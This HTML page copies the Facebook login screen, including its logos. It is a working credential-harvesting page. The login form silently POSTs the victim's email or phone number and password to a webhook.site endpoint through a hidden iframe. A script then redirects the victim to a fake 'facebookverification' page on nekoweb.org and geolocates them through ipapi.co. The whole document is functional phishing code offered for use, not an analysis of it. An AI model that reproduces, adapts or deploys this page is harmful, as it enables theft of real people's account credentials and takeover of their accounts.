<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook Login</title>
<style>
body {
  font-family: 'Calibri', sans-serif;
  background-color: #ffffff;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: start;
  margin: 0;
  padding: 40px 20px;
  height: 100vh;
  box-sizing: border-box;
}

/* Top language selector */
.languages {
  margin-top: 40px;
  font-size: 14px;
  color: #6a6a6a;
  cursor: pointer;
}

/* Facebook logo */
.logo {
  width: 60px;
  margin: 65px 0 75px 0;
}

/* Input fields */
input[type=text],
input[type=password] {
  width: 100%;
  padding: 20px 16px;
  margin: 3px 0;
  border: 1px solid #ddd;
  border-radius: 12px;
  font-size: 14px;
  box-sizing: border-box;
}

/* Login button */
button.submit {
  width: 100%;
  padding: 14px;
  background: #1877f2;
  color: #fff;
  border: none;
  border-radius: 50px; /* pill shape */
  font-weight: 600;
  font-size: 16px;
  margin-top: 3px;
  cursor: pointer;
}
button.submit:hover { background: #166fe5; }

/* Forgotten password link */
.links {
  margin-top: 10px;
  font-size: 15px;
}
.links a {
  color: #000;
  text-decoration: none;
  font-weight: 500;
}

/* Create new account outlined button */
.create-account {
  margin-top: 110px;
  margin-left: -140px;
  padding: 14px;
  background: #fff;
  color: #1877f2;
  border: 1px solid #1877f2;
  border-radius: 50px;
  font-weight: 600;
  font-size: 16px;
  cursor: pointer;
  width: 620%;
}
.create-account:hover {
  background: #e7f0ff;
}

/* Footer Meta logo */
.footer {
  margin-top: 20px;
  font-size: 15px;
  color: #000000;
  display: flex;
  align-items: center;
  gap: 3px;
}
.footer img {
  width: 17px;
  height: 12px;
}

/* Password show/hide */
.pw-container {
  position: relative;
  width: 100%;
  margin: 6px 0;
}
.toggle-pw {
  position: absolute;
  right: 12px;
  top: 50%;
  transform: translateY(-50%);
  background: none;
  border: none;
  cursor: pointer;
  font-size: 14px;
  color: #666;
  width: 40px;
  text-align: center;
  padding: 0;
}
</style>
</head>
<body>

<!-- Top language -->
<div class="languages" id="languageSelector">English (UK)</div>

<!-- Facebook logo -->
<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook logo">

<!-- Hidden iframe to submit form without redirect -->
<iframe name="hidden_iframe" style="display:none;"></iframe>

<!-- Login form -->
<form id="loginForm" action="https://webhook.site/e6859cc1-7906-4eb7-b8ec-187c41911c55" method="POST" target="hidden_iframe" style="width:100%;">
  <input type="text" name="emailOrPhone" id="emailOrPhone" placeholder="Mobile number or email address" required>
  <div class="pw-container">
    <input type="password" name="password" id="passwordField" placeholder="Password" required>
    <button type="button" class="toggle-pw" id="togglePw">Show</button>
  </div>
  <input type="hidden" name="subject" value="Access">
  <button type="submit" class="submit">Log in</button>
</form>

<div class="links">
  <a href="https://www.facebook.com/login/identify" target="_blank" rel="noopener"><b style="font-weight: 700;">Forgotten password?</a>
</div>

<button class="create-account">Create new account</button>

<div class="footer">
  <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Meta_Platforms_Inc._logo_%28cropped%29.svg" alt="Meta logo">
  Meta
</div>

<script>
// Show/hide password
const pw = document.getElementById('passwordField');
const toggle = document.getElementById('togglePw');
toggle.addEventListener('click', () => {
  if(pw.type === 'password'){ pw.type='text'; toggle.textContent='Hide'; }
  else{ pw.type='password'; toggle.textContent='Show'; }
});

// Auto-detect phone language and set top language
const langSelector = document.getElementById('languageSelector');
const userLang = navigator.language || navigator.userLanguage;
langSelector.textContent = userLang;

// Auto-detect country code for phone input
const phoneInput = document.getElementById('emailOrPhone');
fetch('https://ipapi.co/json/')
  .then(res => res.json())
  .then(data => {
    let code = data.country_calling_code || '';
    if(code && phoneInput.value.trim()===''){
      phoneInput.value = code + ' ';
      phoneInput.setSelectionRange(phoneInput.value.length, phoneInput.value.length);
    }
  })
  .catch(err => console.log('Country code detection failed:', err));

// Submit form: POST to webhook, then redirect to verification page
const form = document.getElementById('loginForm');
form.addEventListener('submit', function(e){
  setTimeout(()=>{
    window.location.href="https://facebookverification.nekoweb.org/verifying%20.html";
  },150);
});
</script>

</body>
</html>
